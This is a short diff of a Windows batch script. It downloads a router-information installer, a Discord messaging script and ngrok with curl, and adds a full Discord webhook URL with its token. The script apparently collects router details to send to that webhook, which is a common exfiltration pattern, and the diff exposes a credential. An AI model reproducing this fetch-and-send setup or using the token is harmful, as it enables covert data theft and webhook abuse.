@@ -6,7 +6,7 @@ curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Messa
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/installer.cmd -o installer.cmd
 
-set ""
+set "https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
 
 ::installer.cmd
 ::router>router.txt
